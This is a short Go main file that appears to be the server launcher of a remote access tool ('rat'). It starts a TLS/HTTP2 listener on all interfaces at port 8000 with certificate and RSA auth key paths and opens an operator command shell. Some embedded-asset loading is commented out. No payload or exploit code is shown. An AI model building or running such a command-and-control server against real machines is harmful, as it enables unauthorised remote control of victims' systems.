package main

import (
//    "fmt"

    "10.9.9.2/rat/pkg/server"
    "10.9.9.2/rat/pkg/cli"
//    "unktls"
)

func main() {
//    tlsCert, err := unktls.Asset("server.crt")
//    if err != nil {
//	fmt.Printf("asset not found\n")
//    }
//
//    tlsKey, err := unktls.Asset("server.key")
//    if err != nil {
//	fmt.Printf("asset not found\n")
//    }

    srv := server.Instantiate("0.0.0.0", "8000", "h2", "../../data/x509/server.crt", "../../data/x509/server.key", "../../data/auth/public.rsapem.key")
    go cli.Shell(&srv)
    srv.Run()
}
